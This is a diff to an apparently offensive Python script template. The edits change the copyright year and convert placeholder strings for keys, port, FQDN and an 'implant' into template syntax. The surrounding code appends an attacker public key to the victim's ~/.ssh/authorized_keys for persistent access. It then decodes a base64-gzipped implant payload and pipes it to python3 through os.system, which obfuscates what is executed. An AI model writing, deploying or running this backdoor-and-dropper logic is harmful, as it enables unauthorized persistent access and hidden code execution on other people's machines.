@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Copyright (c) 2023, Oracle and/or its affiliates.
+# Copyright (c) 2024, Oracle and/or its affiliates.
 
 import os
 import sys
@@ -12,10 +12,10 @@ import gzip
 from string import ascii_lowercase
 import socket
 
-PRIVKEY = "PRIVATE_KEY_PLACEHOLDER"
-PUBKEY = "PUBLIC_KEY_PLACEHOLDER"
-PORT = "PORT_PLACEHOLDER"
-FQDN = "FQDN_PLACEHOLDER"
+PRIVKEY = '{{ PRIVATE_KEY_PLACEHOLDER }}'
+PUBKEY = '{{ PUBLIC_KEY_PLACEHOLDER }}'
+PORT = '{{ PORT_PLACEHOLDER }}'
+FQDN = '{{ FQDN_PLACEHOLDER }}'
 
 RW = stat.S_IRUSR | stat.S_IWUSR
 
@@ -72,7 +72,7 @@ with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as f:
     f.write(base64.b64decode(PUBKEY.encode()).decode())  # decode bytes to string
     print("[+] wrote to ~/.ssh/authorized_keys")
 
-payload = ungzbase('IMPLANT_PLACEHOLDER')
+payload = ungzbase('{{ IMPLANT_PLACEHOLDER }}')
 encoded = gzbase(templify(payload, {'KEYFILE_PLACEHOLDER': keypath}))
 
 os.system("echo %s | base64 -d | gzip -d | python3 " % encoded)
